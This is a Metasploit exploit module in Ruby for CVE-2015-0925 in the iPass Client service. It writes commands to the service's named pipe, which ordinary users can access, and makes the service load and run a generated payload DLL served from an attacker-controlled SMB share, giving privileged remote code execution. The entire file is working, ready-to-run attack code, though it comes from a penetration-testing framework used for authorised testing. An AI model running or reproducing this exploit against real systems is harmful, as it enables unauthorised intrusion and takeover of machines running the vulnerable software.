# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::SMB::Client::Authenticated
  include Msf::Exploit::Remote::SMB::Server::Share
  include Msf::Exploit::EXE

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;IPass Control Pipe Remote Command Execution&#039;,
      &#039;Description&#039;    => %q{
        This module exploits a vulnerability in the IPass Client service. This service provides a
        named pipe which can be accessed by the user group BUILTIN\Users. This pipe can be abused
        to force the service to load a DLL from a SMB share.
      },
      &#039;Author&#039;         =>
        [
          &#039;Matthias Kaiser&#039;, # Vulnerability discovery
          &#039;h0ng10 <info[at]mogwaisecurity.de>&#039;, # Metasploit Module
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [ &#039;CVE&#039;, &#039;2015-0925&#039; ],
          [ &#039;OSVDB&#039;, &#039;117423&#039; ],
          [ &#039;BID&#039;, &#039;72265&#039; ],
          [ &#039;URL&#039;, &#039;http://codewhitesec.blogspot.de/2015/02/how-i-could-ipass-your-client-security.html&#039; ],
        ],
      &#039;DefaultOptions&#039;  =>
        {
          &#039;EXITFUNC&#039; => &#039;process&#039;,
        },
      &#039;Payload&#039;         =>
        {
          &#039;Space&#039;       => 2048,
          &#039;DisableNops&#039; => true
        },
      &#039;Platform&#039;        => &#039;win&#039;,
      &#039;Targets&#039;         =>
        [
          [ &#039;Windows x32&#039;, { &#039;Arch&#039; => ARCH_X86 } ],
          [ &#039;Windows x64&#039;, { &#039;Arch&#039; => ARCH_X86_64 } ]
        ],
      &#039;Privileged&#039;      => true,
      &#039;DisclosureDate&#039;  => &#039;Jan 21 2015&#039;,
      &#039;DefaultTarget&#039;   => 0))

    register_options(
      [
        OptInt.new(&#039;SMB_DELAY&#039;, [true, &#039;Time that the SMB Server will wait for the payload request&#039;, 15])
      ], self.class)

    deregister_options(&#039;FILE_CONTENTS&#039;, &#039;FILE_NAME&#039;, &#039;SHARE&#039;, &#039;FOLDER_NAME&#039;)
  end

  def check
    echo_value = rand_text_alphanumeric(rand(10) + 10)

    begin
      response = send_command("System.Echo #{echo_value}")
      if response =~ Regexp.new(echo_value)
        return Exploit::CheckCode::Vulnerable
      else
        return Exploit::CheckCode::Unknown
      end
    rescue Rex::ConnectionError => e
      vprint_error("Connection failed: #{e.class}: #{e}")
      return Msf::Exploit::CheckCode::Unknown
    rescue Rex::Proto::SMB::Exceptions::LoginError => e
      vprint_error(&#039;Connection reset during login&#039;)
      return Msf::Exploit::CheckCode::Unknown
    end
  end

  def setup
    super
    self.file_name = "#{Rex::Text.rand_text_alpha(7)}.dll"
    self.share = Rex::Text.rand_text_alpha(5)
  end

  def primer
    self.file_contents = generate_payload_dll
    print_status("File available on #{unc}...")
    send_command("iPass.SWUpdateAssist.RegisterCOM #{unc}")
  end

  def send_command(command)
    # The connection is closed after each command, so we have to reopen it
    connect
    smb_login
    pipe = simple.create_pipe(&#039;\\IPEFSYSPCPIPE&#039;)
    pipe.write(Rex::Text.to_unicode(command))
    response = Rex::Text.to_ascii(pipe.read)

    response
  end


  def exploit
    begin
      Timeout.timeout(datastore[&#039;SMB_DELAY&#039;]) { super }
    rescue Timeout::Error
      # do nothing... just finish exploit and stop smb server...
    end
  end

end

